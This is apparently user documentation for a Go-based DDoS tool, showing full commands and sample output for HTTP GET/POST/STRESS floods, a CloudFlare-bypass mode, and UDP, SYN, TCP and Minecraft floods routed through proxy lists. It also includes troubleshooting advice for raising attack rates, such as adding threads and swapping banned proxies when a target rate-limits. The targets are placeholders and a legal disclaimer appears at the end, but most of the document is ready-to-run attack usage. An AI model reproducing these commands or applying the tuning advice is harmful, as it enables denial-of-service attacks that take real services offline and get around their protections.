# Attack Output Examples

**Maintained By**: Muhammad Thariq  
**Last Updated**: November 2025  
**Version**: 2.5 SNAPSHOT

---

## Overview

This document provides examples of the improved attack output display, showing all the information presented when running different types of attacks.

---

## Table of Contents

- [Layer 7 Attack Output](#layer-7-attack-output)
- [Layer 4 Attack Output](#layer-4-attack-output)
- [Attack Progress Display](#attack-progress-display)
- [Attack Summary](#attack-summary)
- [Output Field Explanations](#output-field-explanations)

---

## Layer 7 Attack Output

### Example: GET Attack with Proxies

**Command:**
```bash
./ddos-tools GET https://example.com 5 900 proxies.txt 100 70
```

**Output:**
```
[OK] Loaded 932 user agents from files/useragent.txt
[OK] Loaded 575 referers from files/referers.txt
2025/12/04 06:55:39 Proxy Count: 1155
[OK] Loaded 1155 proxies

  Attack Configuration
  ─────────────────────────────────────
  Method:      GET
  Target:      https://example.com
  Layer:       Layer7
  Threads:     900
  Duration:    70 seconds
  RPC:         100
  Proxies:     1155 (SOCKS5)
  User Agents: 932
  Referers:    575
  ─────────────────────────────────────

[INFO] Attack started at 06:55:39
[INFO] Press Ctrl+C to stop the attack

  / Target: https://example.com | Method: GET | PPS: 45234 | BPS: 12.5 MB [===================] 100.0%
[OK] Attack duration completed


  Attack Summary
  ─────────────────────────────────────
  Method:          GET
  Target:          https://example.com
  Duration:        70s
  Total Requests:  3.2M
  Total Data Sent: 875.3 MB
  Avg. RPS:        45234
  Avg. BPS:        12.5 MB
  ─────────────────────────────────────
```

---

### Example: POST Attack with HTTP Proxies

**Command:**
```bash
./ddos-tools POST https://api.example.com/submit 1 500 http-proxies.txt 50 120
```

**Output:**
```
[OK] Loaded 932 user agents from files/useragent.txt
[OK] Loaded 575 referers from files/referers.txt
2025/12/04 07:10:15 Proxy Count: 2340
[OK] Loaded 2340 proxies

  Attack Configuration
  ─────────────────────────────────────
  Method:      POST
  Target:      https://api.example.com/submit
  Layer:       Layer7
  Threads:     500
  Duration:    120 seconds
  RPC:         50
  Proxies:     2340 (HTTP)
  User Agents: 932
  Referers:    575
  ─────────────────────────────────────

[INFO] Attack started at 07:10:15
[INFO] Press Ctrl+C to stop the attack
```

---

### Example: Attack Without Proxies

**Command:**
```bash
./ddos-tools STRESS https://example.com 0 200 - 150 60
```

**Output:**
```
[OK] Loaded 932 user agents from files/useragent.txt
[OK] Loaded 575 referers from files/referers.txt

  Attack Configuration
  ─────────────────────────────────────
  Method:      STRESS
  Target:      https://example.com
  Layer:       Layer7
  Threads:     200
  Duration:    60 seconds
  RPC:         150
  User Agents: 932
  Referers:    575
  ─────────────────────────────────────

[INFO] Attack started at 07:15:22
[INFO] Press Ctrl+C to stop the attack
```

---

### Example: CloudFlare Bypass Attack

**Command:**
```bash
./ddos-tools CFB https://protected.example.com 5 1000 socks5.txt 75 300
```

**Output:**
```
[OK] Loaded 932 user agents from files/useragent.txt
[OK] Loaded 575 referers from files/referers.txt
2025/12/04 07:20:45 Proxy Count: 850
[OK] Loaded 850 proxies

  Attack Configuration
  ─────────────────────────────────────
  Method:      CFB
  Target:      https://protected.example.com
  Layer:       Layer7
  Threads:     1000
  Duration:    300 seconds
  RPC:         75
  Proxies:     850 (SOCKS5)
  User Agents: 932
  Referers:    575
  ─────────────────────────────────────

[INFO] Attack started at 07:20:45
[INFO] Press Ctrl+C to stop the attack
```

---

## Layer 4 Attack Output

### Example: UDP Flood

**Command:**
```bash
./ddos-tools UDP 192.168.1.100:80 500 120
```

**Output:**
```
[INFO] Resolving hostname 192.168.1.100...
[OK] Resolved to 192.168.1.100

  Attack Configuration
  ─────────────────────────────────────
  Method:      UDP
  Target:      192.168.1.100:80
  Layer:       Layer4
  Threads:     500
  Duration:    120 seconds
  ─────────────────────────────────────

[INFO] Attack started at 07:30:10
[INFO] Press Ctrl+C to stop the attack

  | Target: 192.168.1.100:80 | Method: UDP | PPS: 125000 | BPS: 75.2 MB [=================] 95.0%
```

---

### Example: SYN Flood (Requires Root)

**Command:**
```bash
sudo ./ddos-tools SYN example.com:443 1000 60
```

**Output:**
```
[INFO] Resolving hostname example.com...
[OK] Resolved to 93.184.216.34

  Attack Configuration
  ─────────────────────────────────────
  Method:      SYN
  Target:      93.184.216.34:443
  Layer:       Layer4
  Threads:     1000
  Duration:    60 seconds
  ─────────────────────────────────────

[INFO] Attack started at 07:35:20
[INFO] Press Ctrl+C to stop the attack
```

---

### Example: Minecraft Server Attack

**Command:**
```bash
./ddos-tools MINECRAFT mc.example.com:25565 300 90
```

**Output:**
```
[INFO] Resolving hostname mc.example.com...
[OK] Resolved to 198.51.100.50

  Attack Configuration
  ─────────────────────────────────────
  Method:      MINECRAFT
  Target:      198.51.100.50:25565
  Layer:       Layer4
  Threads:     300
  Duration:    90 seconds
  ─────────────────────────────────────

[INFO] Attack started at 07:40:15
[INFO] Press Ctrl+C to stop the attack
```

---

### Example: TCP Flood with Proxies

**Command:**
```bash
./ddos-tools TCP example.com:80 5 400 socks5.txt 60
```

**Output:**
```
[INFO] Resolving hostname example.com...
[OK] Resolved to 93.184.216.34
2025/12/04 07:45:30 Proxy Count: 1500
[OK] Loaded 1500 proxies

  Attack Configuration
  ─────────────────────────────────────
  Method:      TCP
  Target:      93.184.216.34:80
  Layer:       Layer4
  Threads:     400
  Duration:    60 seconds
  Proxies:     1500 (SOCKS5)
  ─────────────────────────────────────

[INFO] Attack started at 07:45:30
[INFO] Press Ctrl+C to stop the attack
```

---

## Attack Progress Display

During the attack, you'll see a live progress indicator:

### Format:
```
[Spinner] Target: <URL> | Method: <METHOD> | PPS: <packets/sec> | BPS: <bytes/sec> [Progress Bar] <percentage>%
```

### Examples:

**Low traffic:**
```
  / Target: https://example.com | Method: GET | PPS: 1234 | BPS: 512.3 KB [=====-----------] 25.0%
```

**Medium traffic:**
```
  - Target: https://example.com | Method: POST | PPS: 15678 | BPS: 4.2 MB [==========------] 55.5%
```

**High traffic:**
```
  \ Target: https://example.com | Method: STRESS | PPS: 98765 | BPS: 45.8 MB [===============-] 88.9%
```

**Attack completed:**
```
  | Target: https://example.com | Method: GET | PPS: 45234 | BPS: 12.5 MB [================] 100.0%
[OK] Attack duration completed
```

### Spinner Animation:
The spinner rotates through these characters: `|`, `/`, `-`, `\`

This provides visual feedback that the attack is running.

---

## Attack Summary

After the attack completes (or is stopped with Ctrl+C), a summary is displayed:

### Complete Summary Example:

```

  Attack Summary
  ─────────────────────────────────────
  Method:          GET
  Target:          https://example.com
  Duration:        70s
  Total Requests:  3.2M
  Total Data Sent: 875.3 MB
  Avg. RPS:        45234
  Avg. BPS:        12.5 MB
  ─────────────────────────────────────

```

### Summary with Manual Stop (Ctrl+C):

```
^C
Attack stopped by user


  Attack Summary
  ─────────────────────────────────────
  Method:          STRESS
  Target:          https://api.example.com
  Duration:        45s
  Total Requests:  2.1M
  Total Data Sent: 512.8 MB
  Avg. RPS:        46667
  Avg. BPS:        11.4 MB
  ─────────────────────────────────────

```

---

## Output Field Explanations

### Attack Configuration Banner

| Field | Description | When Shown |
|-------|-------------|------------|
| **Method** | Attack method being used (GET, POST, UDP, etc.) | Always |
| **Target** | Target URL or IP:Port | Always |
| **Layer** | Attack layer (Layer7 or Layer4) | Always |
| **Threads** | Number of concurrent attack threads | Always |
| **Duration** | Attack duration in seconds | Always |
| **RPC** | Requests Per Connection - how many requests each thread sends | Layer 7 only |
| **Proxies** | Number and type of proxies loaded | When proxies are used |
| **User Agents** | Number of user agents loaded | Layer 7 only |
| **Referers** | Number of referers loaded | Layer 7 only |

---

### Progress Display Fields

| Field | Description | Format |
|-------|-------------|--------|
| **Spinner** | Rotating animation showing activity | `\|`, `/`, `-`, `\` |
| **Target** | Current target being attacked | URL or IP:Port |
| **Method** | Attack method | Method name |
| **PPS** | Packets/Requests Per Second (current rate) | Number with thousand separators |
| **BPS** | Bytes Per Second (current bandwidth) | Human-readable (KB, MB, GB) |
| **Progress Bar** | Visual progress indicator | `[====--------]` |
| **Percentage** | Attack completion percentage | 0.0% to 100.0% |

---

### Attack Summary Fields

| Field | Description | Format |
|-------|-------------|--------|
| **Method** | Attack method used | Method name |
| **Target** | Target that was attacked | URL or IP:Port |
| **Duration** | Total attack duration | Seconds (e.g., "70s") |
| **Total Requests** | Total number of requests sent | Human-readable (K, M, B) |
| **Total Data Sent** | Total bandwidth used | Human-readable (MB, GB) |
| **Avg. RPS** | Average Requests Per Second | Number with thousand separators |
| **Avg. BPS** | Average Bytes Per Second | Human-readable (MB/s, GB/s) |

---

## Proxy Type Display Values

When proxies are used, the type is displayed:

| Type Code | Display Value | Description |
|-----------|---------------|-------------|
| 0 | All (Mixed) | Mixed proxy types |
| 1 | HTTP | HTTP/HTTPS proxies |
| 4 | SOCKS4 | SOCKS4 proxies |
| 5 | SOCKS5 | SOCKS5 proxies |
| 6 | Random | Random selection |

---

## Color-Coded Output

The output uses color coding for better readability:

- 🔵 **Cyan** - Headers and section titles
- 🟢 **Green** - Success messages ([OK])
- 🟡 **Yellow** - Warnings ([WARN])
- 🔴 **Red** - Errors ([ERROR])
- 🟣 **Magenta** - Important values (targets, numbers)
- 🟡 **Bright Yellow** - Methods

*Note: Colors can be disabled by setting `NO_COLOR` environment variable*

---

## Output Comparison: Before vs After

### Before (Old Output):
```
  Attack Configuration
  ─────────────────────────────────────
  Method:   GET
  Target:   https://example.com
  Layer:    Layer7
  Threads:  900
  Duration: 70 seconds
  ─────────────────────────────────────
```

### After (New Improved Output):
```
  Attack Configuration
  ─────────────────────────────────────
  Method:      GET
  Target:      https://example.com
  Layer:       Layer7
  Threads:     900
  Duration:    70 seconds
  RPC:         100
  Proxies:     1155 (SOCKS5)
  User Agents: 932
  Referers:    575
  ─────────────────────────────────────
```

### Improvements:
✅ Shows RPC (critical for understanding attack intensity)  
✅ Shows proxy count and type (transparency in attack source)  
✅ Shows user agent count (diversity indicator)  
✅ Shows referer count (request header diversity)  
✅ Better column alignment for readability  
✅ Complete attack parameter visibility  

---

## Tips for Reading Output

### 1. **Check Configuration Before Starting**
Always verify the attack configuration banner shows the correct:
- Target URL/IP
- Thread count
- Duration
- RPC (for Layer 7)
- Proxy count and type

### 2. **Monitor Real-Time Progress**
Watch the PPS and BPS values to ensure the attack is running effectively:
- **Low PPS** (<1000): May indicate network issues or ineffective proxies
- **Medium PPS** (1000-50000): Normal for most attacks
- **High PPS** (>50000): Very aggressive attack

### 3. **Review the Summary**
After completion, check:
- Total requests sent
- Average RPS achieved
- Total bandwidth used
- Verify it matches your expectations

### 4. **Understanding Performance**
- **RPC × Threads** = Theoretical maximum requests per cycle
- **Actual RPS** may be lower due to network latency, target response time, etc.
- **High thread count** doesn't always mean better performance

---

## Example: Full Attack Session

Here's a complete example from start to finish:

```bash
$ ./ddos-tools GET https://example.com 5 900 proxies.txt 100 70
```

**Complete Output:**
```
  ____  ____       ____  _____           _
 |  _ \|  _ \  ___/ ___||_   _|__   ___ | |___
 | | | | | | |/ _ \___ \  | |/ _ \ / _ \| / __|
 | |_| | |_| | (_) |__) | | | (_) | (_) | \__ \
 |____/|____/ \___/____/  |_|\___/ \___/|_|___/

  DDoS Attack Script - Go Version 2.5

[OK] Loaded 932 user agents from files/useragent.txt
[OK] Loaded 575 referers from files/referers.txt
2025/12/04 06:55:39 Proxy Count: 1155
[OK] Loaded 1155 proxies

  Attack Configuration
  ─────────────────────────────────────
  Method:      GET
  Target:      https://example.com
  Layer:       Layer7
  Threads:     900
  Duration:    70 seconds
  RPC:         100
  Proxies:     1155 (SOCKS5)
  User Agents: 932
  Referers:    575
  ─────────────────────────────────────

[INFO] Attack started at 06:55:39
[INFO] Press Ctrl+C to stop the attack

  / Target: https://example.com | Method: GET | PPS: 0 | BPS: 0 B [-------------------] 2.3%
  - Target: https://example.com | Method: GET | PPS: 12450 | BPS: 3.2 MB [===----------------] 15.7%
  \ Target: https://example.com | Method: GET | PPS: 34120 | BPS: 8.9 MB [========-----------] 42.5%
  | Target: https://example.com | Method: GET | PPS: 45234 | BPS: 12.5 MB [=============------] 68.3%
  / Target: https://example.com | Method: GET | PPS: 47890 | BPS: 13.1 MB [================---] 89.1%
  - Target: https://example.com | Method: GET | PPS: 45234 | BPS: 12.5 MB [===================] 100.0%
[OK] Attack duration completed


  Attack Summary
  ─────────────────────────────────────
  Method:          GET
  Target:          https://example.com
  Duration:        70s
  Total Requests:  3.2M
  Total Data Sent: 875.3 MB
  Avg. RPS:        45234
  Avg. BPS:        12.5 MB
  ─────────────────────────────────────

```

---

## Troubleshooting Output Issues

### Issue: No Proxy Count Shown
**Possible Causes:**
- Proxy file not found
- Proxy file is empty
- Incorrect proxy format

**Solution:**
- Check proxy file path
- Verify file contains valid proxies
- See [PROXIES.md](PROXIES.md) for correct format

---

### Issue: Low PPS Values
**Possible Causes:**
- Target is rate-limiting
- Proxies are slow or banned
- Too few threads

**Solution:**
- Increase thread count
- Use faster/different proxies
- Increase RPC value

---

### Issue: Progress Stuck at 0%
**Possible Causes:**
- Network connectivity issues
- All proxies are blocked
- Target is unreachable

**Solution:**
- Check internet connection
- Verify target URL is accessible
- Try different proxies
- Run without proxies to test

---

## Legal Notice

**Remember:** This output is from authorized security testing only. The examples shown use placeholder targets (example.com, etc.). 

⚠️ **Never use this tool on systems you don't own or have explicit written permission to test.**

See [LEGAL.md](LEGAL.md) for complete legal guidelines.

---

**Maintained By**: Muhammad Thariq  
**Copyright**: © 2025 Muhammad Thariq  
**License**: MIT with Educational Use Terms

For questions about output interpretation or issues, please open an issue on GitHub.